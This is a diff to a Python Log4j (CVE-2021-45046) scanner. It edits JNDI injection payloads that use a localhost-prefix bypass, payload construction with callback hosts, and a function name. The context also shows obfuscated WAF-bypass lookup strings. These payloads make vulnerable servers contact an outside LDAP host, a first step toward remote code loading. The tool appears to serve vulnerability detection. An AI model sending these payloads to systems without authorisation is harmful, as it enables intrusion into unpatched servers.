@@ -61,9 +61,9 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        ]
 
 cve_2021_45046 = [
-                  "${jndi:ldap://#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
-                  "${jndi:ldap://#{{callback_host}}/{{random}}}",
-                  "${jndi:ldap://#{{callback_host}}/{{random}}}"
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                  ]  
 
 
@@ -133,6 +133,7 @@ proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
 
+
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
     fuzzing_headers.update(default_headers)
@@ -163,6 +164,7 @@ def generate_waf_bypass_payloads(callback_host, random_string):
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
+
 
 def get_cve_2021_45046_payloads(callback_host, random_string):
     payloads = []
@@ -281,8 +283,10 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    # payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
-    payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
+    if args.custom_dns_callback_host:
+        payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
+    else:
+        payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -335,7 +339,7 @@ def scan_url(url, callback_host):
                 cprint(f"EXCEPTION: {e}")
 
 
-def main():
+def entrypoint():
     urls = []
     if args.url:
         urls.append(args.url)
@@ -384,7 +388,7 @@ def main():
 
 if __name__ == "__main__":
     try:
-        main()
+        entrypoint()
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
